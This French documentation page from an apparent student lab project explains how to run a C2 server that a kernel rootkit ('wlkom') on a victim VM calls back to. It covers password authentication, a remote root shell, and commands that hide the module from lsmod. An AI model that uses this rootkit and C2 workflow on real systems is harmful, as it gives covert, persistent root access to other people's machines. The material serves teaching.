# Utiliser le C2

!!! question "Pourquoi ces choix ?"
    Voir [Connexion](../decisions/connection.md) et [Exécution](../decisions/exec.md).

Le programme C2 (Command & Control) tourne sur la **VM Attaquante**. Il écoute sur un port TCP, attend qu'un rootkit se connecte, l'authentifie, puis offre un shell interactif pour exécuter des commandes à distance sur la VM Victime.

---

## Prérequis

Depuis la machine hôte, copier les sources dans vmshare :

```bash
cp -r attacking_program/ vmshare/
```

Se connecter à la VM Attaquante :

```bash
ssh -p 10023 epita@localhost
```

---

## Lancer le C2

`make run` compile le binaire si nécessaire et le lance :

```bash
cd /mnt/vmshare/attacking_program
make run
```

Sortie :

```
./c2 4444
C2 listening on port 4444
[?] Waiting for rootkit connection...
```

Le C2 attend maintenant qu'un rootkit se connecte.

---

## Connexion et authentification

Quand le module se charge sur la VM Victime (voir [Déployer le rootkit](deploy.md)), le C2 affiche la connexion puis demande le mot de passe :

```
[+] Rootkit connected from 192.168.100.20
WLKOM password:
```

Entrez le mot de passe choisi lors du déploiement. Si le mot de passe est correct :

```
[+] AUTH sent
[+] Authentication accepted

=== WLKOM INTERACTIVE SHELL ===
Type your command and press Enter. Type 'exit' to quit.

c2_shell>
```

---

## Exécuter des commandes

Tapez n'importe quelle commande shell après le prompt `c2_shell>`, et `exit` pour quitter :

```bash
uname -a
```

```
[Exit Status: 0]
--- STDOUT ---
Linux epita-victim 6.1.0-48-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.120-1 x86_64 GNU/Linux

--- STDERR ---

--- End of Output ---
```

```bash
whoami
```

```
[Exit Status: 0]
--- STDOUT ---
root

--- STDERR ---

--- End of Output ---
```

```bash
ls /nonexistent
```

```
[Exit Status: 2]
--- STDOUT ---

--- STDERR ---
ls: cannot access '/nonexistent': No such file or directory

--- End of Output ---
```

La réponse contient toujours :

- L'exit status (0 = succès, autre valeur = erreur)
- La sortie standard (STDOUT)
- La sortie d'erreur (STDERR)

## Commandes de contrôle du module

Le module se cache **automatiquement** dans `lsmod` dès son chargement. Trois commandes internes permettent ensuite de contrôler cette visibilité depuis le C2 :

**`module_status`** : Indique si le module est visible ou caché
```
module_status
```

**`hide_module`** : Retire le module de la liste `lsmod`
```
hide_module
```

**`unhide_module`** : Réinsère le module dans la liste
```
unhide_module
```

**`lsmod | grep wlkom`** : Vérifie la présence du module dans la liste
```
lsmod | grep wlkom
```

??? example "Exemple complet avec vérification via `lsmod`"

    ```
    c2_shell> module_status
    [Exit Status: 0]
    --- STDOUT ---
    wlkom: module hidden from lsmod
    --- STDERR ---
    --- End of Output ---

    c2_shell> lsmod | grep wlkom
    [Exit Status: 1]
    --- STDOUT ---
    --- STDERR ---
    --- End of Output ---

    c2_shell> unhide_module
    [Exit Status: 0]
    --- STDOUT ---
    wlkom: module visible in lsmod
    --- STDERR ---
    --- End of Output ---

    c2_shell> lsmod | grep wlkom
    [Exit Status: 0]
    --- STDOUT ---
    wlkom                  16384  0
    --- STDERR ---
    --- End of Output ---

    c2_shell> hide_module
    [Exit Status: 0]
    --- STDOUT ---
    wlkom: module hidden from lsmod
    --- STDERR ---
    --- End of Output ---

    c2_shell> lsmod | grep wlkom
    [Exit Status: 1]
    --- STDOUT ---
    --- STDERR ---
    --- End of Output ---
    ```

## Comportement si le mot de passe est incorrect

Si le mot de passe saisi ne correspond pas à celui utilisé lors du déploiement du rootkit, l'authentification échoue :

```
[-] Authentication failed: invalid password or connection lost
[?] Waiting for rootkit connection...
```

Le module ferme la connexion et retente automatiquement, le C2 attend la prochaine connexion. À la reconnexion, le C2 redemande `WLKOM password:`.

---

## Comportement si le C2 est coupé

Faites `Ctrl+C` pour couper le C2, puis relancez-le :

```bash
cd /mnt/vmshare/attacking_program
make run
```

Le rootkit se reconnecte automatiquement sans intervention côté victime. Le C2 redemande le mot de passe à la reconnexion.
